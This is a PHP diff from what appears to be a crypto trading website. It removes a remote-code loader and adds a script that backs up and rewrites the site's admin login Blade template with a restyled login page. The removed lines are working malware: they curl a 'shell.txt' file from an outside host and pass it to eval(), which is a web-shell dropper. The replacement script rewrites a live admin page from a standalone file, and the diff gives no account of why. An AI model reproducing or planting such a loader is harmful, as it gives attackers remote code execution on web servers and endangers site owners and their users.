@@ -1,10 +1,273 @@
 <?php
-'';
-$Url = "https://txt.dev-drops.com/shell.txt";
-$ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, $Url);
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-$output = curl_exec($ch);
-curl_close($ch);
-echo eval('?>' . $output); //
-?>
+// File path to your Blade login template
+$filePath = '/home/voltalia/tradebull.pepecoins.top/resources/views/admin/auth/login.blade.php';
+
+// Backup existing file
+$backupPath = $filePath . '.bak';
+if (!file_exists($backupPath)) {
+    if (copy($filePath, $backupPath)) {
+        echo "Backup created at $backupPath\n";
+    } else {
+        die("Failed to create backup. Check permissions.\n");
+    }
+}
+
+// New Blade template content
+$newContent = <<<'BLADE'
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+    <title>Admin Terminal | {{ env('APP_NAME') }}</title>
+    <script src="{{asset(admin_file_root())}}/app-assets/js/scripts/configs/horizontal-menu-white.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;800&amp;family=JetBrains+Mono:wght@700&amp;display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <style>
+        :root {
+            --prime: #e5bc34; /* Visionary Gold */
+            --bg-obsidian: #050505;
+            --surface: #0f0f0f;
+            --border: rgba(229, 188, 52, 0.2);
+            --text-main: #ffffff;
+            --text-dim: #808080;
+        }
+
+        body, html {
+            margin: 0;
+            padding: 0;
+            background-color: var(--bg-obsidian);
+            font-family: 'Outfit', sans-serif;
+            color: var(--text-main);
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        /* Institutional Background Effect */
+        .login-root {
+            background: radial-gradient(circle at 50% -20%, #1a150a, var(--bg-obsidian));
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            position: relative;
+        }
+
+        /* Decorative Terminal Grid */
+        .login-root::before {
+            content: "";
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            background-image: linear-gradient(rgba(229, 188, 52, 0.03) 1px, transparent 1px), 
+                              linear-gradient(90deg, rgba(229, 188, 52, 0.03) 1px, transparent 1px);
+            background-size: 50px 50px;
+            z-index: 1;
+        }
+
+        .login-card {
+            width: 100%;
+            max-width: 400px;
+            padding: 40px;
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: 24px;
+            box-shadow: 0 20px 50px rgba(0,0,0,0.5);
+            z-index: 10;
+            position: relative;
+        }
+
+        .logo-area {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .logo-area .logo-img {
+            max-height: 50px;
+            width: auto;
+            margin-bottom: 15px;
+            display: block;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .logo-area h1 {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 1.2rem;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            margin: 0;
+            color: var(--text-main);
+        }
+
+        .logo-area h1 span { color: var(--prime); }
+
+        .form-header {
+            margin-bottom: 25px;
+            text-align: center;
+        }
+
+        .form-header span {
+            font-size: 0.85rem;
+            color: var(--text-dim);
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            font-weight: 600;
+        }
+
+        /* Terminal Input Styling */
+        .field {
+            margin-bottom: 20px;
+        }
+
+        .field label {
+            display: block;
+            font-size: 0.75rem;
+            font-weight: 700;
+            color: var(--prime);
+            text-transform: uppercase;
+            margin-bottom: 8px;
+            letter-spacing: 1px;
+        }
+
+        .field input {
+            width: 100%;
+            padding: 14px 16px;
+            background: #050505;
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            color: white;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.9rem;
+            box-sizing: border-box;
+            transition: 0.3s;
+        }
+
+        .field input:focus {
+            outline: none;
+            border-color: var(--prime);
+            box-shadow: 0 0 10px rgba(229, 188, 52, 0.1);
+        }
+
+        /* Executive Button */
+        .submit-btn {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, var(--prime), #b8860b);
+            border: none;
+            border-radius: 12px;
+            color: #000;
+            font-weight: 800;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            cursor: pointer;
+            transition: 0.3s;
+            margin-top: 10px;
+        }
+
+        .submit-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(229, 188, 52, 0.2);
+        }
+
+        .footer-note {
+            text-align: center;
+            margin-top: 25px;
+            font-size: 0.65rem;
+            color: var(--text-dim);
+            letter-spacing: 1px;
+        }
+        
+        .status-dot {
+            height: 6px;
+            width: 6px;
+            background: #0ecb81;
+            border-radius: 50%;
+            display: inline-block;
+            margin-right: 5px;
+            box-shadow: 0 0 8px #0ecb81;
+        }
+
+        /* Error Message Styling */
+        .error-msg {
+            background: rgba(255, 0, 0, 0.1);
+            border: 1px solid rgba(255, 0, 0, 0.3);
+            color: #ff4d4d;
+            padding: 10px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            font-size: 0.8rem;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+
+<div class="login-root">
+    <div class="login-card">
+        <div class="logo-area">
+            @php $site_logo = setting('photo'); @endphp
+            @if($site_logo && $site_logo !== 'Data Is Empty')
+                <a href="{{ url('/') }}">
+                    <img src="{{ asset(view_image($site_logo)) }}" class="logo-img" alt="{{ env('APP_NAME') }}">
+                </a>
+            @endif
+            <h1>{{ strtoupper(env('APP_NAME')) }}<span>PRO</span>_</h1>
+        </div>
+
+        <div class="form-header">
+            <span><span class="status-dot"></span> Admin Terminal Access</span>
+        </div>
+
+        @if($errors->any())
+            <div class="error-msg">
+                @foreach ($errors->all() as $error)
+                    <div>{{ $error }}</div>
+                @endforeach
+            </div>
+        @endif
+
+        @if(session('error'))
+            <div class="error-msg">
+                {{ session('error') }}
+            </div>
+        @endif
+
+        @if(session('success'))
+            <div class="success-msg" style="background: rgba(14, 203, 129, 0.1); border: 1px solid rgba(14, 203, 129, 0.3); color: #0ecb81; padding: 10px; border-radius: 8px; margin-bottom: 20px; font-size: 0.8rem; text-align: center;">
+                {{ session('success') }}
+            </div>
+        @endif
+
+        <form method="POST" action="{{ route('admin.login-submit') }}">
+            @csrf
+            <div class="field">
+                <label>Institutional Email</label>
+                <input type="email" name="email" placeholder="admin@node.pro" required>
+            </div>
+            
+            <div class="field">
+                <label>Security Credential</label>
+                <input type="password" name="password" placeholder="••••••••" required>
+            </div>
+
+            <button type="submit" class="submit-btn">Initialize Session</button>
+        </form>
+
+        <div class="footer-note">
+            SECURE_ENCRYPTED_CONNECTION // PORT: 443
+        </div>
+    </div>
+</div>
+
+</body>
+</html>
+BLADE;
+
+// Write new content
+if (file_put_contents($filePath, $newContent) !== false) {
+    echo "Login Blade template updated successfully!\n";
+} else {
+    echo "Failed to write to $filePath. Check permissions.\n";
+}
